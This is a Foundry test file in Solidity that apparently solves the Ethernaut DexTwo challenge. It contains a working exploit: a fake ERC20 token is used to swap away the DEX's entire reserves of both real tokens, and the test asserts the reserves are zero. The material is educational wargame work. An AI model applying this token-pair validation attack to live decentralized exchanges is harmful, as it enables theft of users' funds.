// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {EthernautDexTwo} from "../../src/ethernaut/DexTwo.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract FakeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DexTwoTest is Test {
    EthernautDexTwo level;
    DamnValuableToken token1;
    DamnValuableToken token2;
    FakeToken fake;
    address player = makeAddr("player");

    function setUp() public {
        token1 = new DamnValuableToken();
        token2 = new DamnValuableToken();
        level = new EthernautDexTwo(address(token1), address(token2));
        token1.transfer(address(level), 100);
        token2.transfer(address(level), 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);
        fake = new FakeToken();
        fake.mint(player, 2);
    }

    function testDexTwoExploitDrainsAll() public {
        // Seed the dex with 1 fake token, then swap it for the full reserve.
        vm.startPrank(player);
        fake.mint(player, 2);
        fake.transfer(address(level), 1);
        fake.approve(address(level), type(uint256).max);
        token1.approve(address(level), type(uint256).max);
        token2.approve(address(level), type(uint256).max);
        level.approve(address(level), type(uint256).max);

        level.swap(address(fake), address(token1), 1);
        level.swap(address(fake), address(token2), 2);
        vm.stopPrank();

        assertEq(token1.balanceOf(address(level)), 0);
        assertEq(token2.balanceOf(address(level)), 0);
    }
}

contract DexTwoControlTest is Test {
    function testInitialReserves() public {
        DamnValuableToken token1 = new DamnValuableToken();
        DamnValuableToken token2 = new DamnValuableToken();
        EthernautDexTwo level = new EthernautDexTwo(address(token1), address(token2));
        token1.transfer(address(level), 100);
        token2.transfer(address(level), 100);
        assertEq(token1.balanceOf(address(level)), 100);
        assertEq(token2.balanceOf(address(level)), 100);
    }
}

// end

